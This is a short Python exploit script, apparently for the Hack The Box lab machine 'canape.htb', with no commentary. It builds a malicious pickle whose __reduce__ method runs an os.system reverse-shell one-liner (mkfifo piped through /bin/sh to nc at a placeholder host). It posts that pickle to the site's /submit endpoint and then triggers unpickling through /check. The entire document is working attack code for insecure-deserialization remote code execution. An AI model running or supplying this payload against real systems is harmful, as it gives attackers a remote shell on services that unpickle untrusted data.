import os
import cPickle
import requests
from hashlib import md5
import sys

class Exploit(object):
   def __reduce__(self):
     return (os.system, ('echo homer;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc remote@ port >/tmp/f',))

def calPayload():
   return cPickle.dumps(Exploit())

shellcode = calPayload()

r = requests.post("http://canape.htb/submit", data = {'character':shellcode, 'quote': '\n' })
print(r.status_code,r.reason)

md5hash = md5(shellcode+"\n").hexdigest()
r1 = requests.post("http://canape.htb/check", data = {'id':md5hash})
print(r1.status_code,r1.reason)
